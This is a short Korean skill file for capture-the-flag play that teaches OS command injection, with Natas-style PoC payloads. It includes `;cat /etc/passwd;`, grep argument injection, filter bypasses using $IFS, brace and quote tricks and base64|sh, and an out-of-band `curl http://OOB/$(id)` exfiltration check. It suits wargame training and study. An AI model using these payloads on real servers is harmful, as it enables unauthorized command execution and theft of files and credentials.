---
name: command-injection
description: OS 커맨드 인젝션으로 셸 명령 실행·파일 읽기
---
## When
서버가 입력을 셸 명령으로 실행(grep/ping/nslookup/이미지 변환/압축 등);
소스에 `system`/`exec`/`passthru`/`popen`/백틱; 입력이 명령 출력에 섞임

## Tools
curl; 블라인드면 OOB(수신 도메인/서버)·`sleep` 시간기반

## Procedure
1) 주입점 확인: 입력이 셸에 연결되는지(`;` `\n` `` ` `` `$()` 테스트)
2) 메타문자 주입: `;` `|` `&` `$()` `` `` `` 개행으로 명령 이어붙임; 주석 `#`으로 뒷부분 무력화
3) 필터 우회:
   (a) 문자 필터 시 실행 프로그램 자체 기능 악용 — 예 `grep <pat> <victim>`에 파일 인자 주입
       (=인자 인젝션, 메타문자 불필요),
   (b) 공백·문자 회피 `$IFS`·`{cat,flag}`·따옴표삽입(`c""at`)·`\` 이스케이프·인코딩(base64|sh)
4) 블라인드면 아웃오브밴드(`curl http://OOB/$(id)`)·시간지연(`sleep 5`)으로 확인
5) 대상 파일 읽기로 플래그 확보

## PoC
```
# 직접 실행 (natas9류: passthru("grep -i $needle dict"))
?needle=.%20/etc/natas_webpass/natas10%20%23&submit=Search   # grep . <file> #
?needle=;cat /etc/passwd;

# [;|&] 필터 시 grep 자체(인자 인젝션)로 파일 노출 (natas10류)
?needle=.* /etc/natas_webpass/natas11   # grep '.*' <dict> <target>

# 필터 우회 소품
$IFS 대신 공백; a=c;$a''at flag; c\at flag; {cat,flag}
```

## Pitfalls
차단 문자 집합을 소스로 정확히 파악(공백만? `;|&`만?);
명령 인젝션이 막혀도 인자 인젝션(옵션·파일 인자)이 열려있는 경우 많음;
공백 필터→`$IFS`/중괄호; 인용부호 안 주입은 먼저 `"`/`'` 탈출; 출력 잘리면 grep 패턴/`head`로 부분 유출
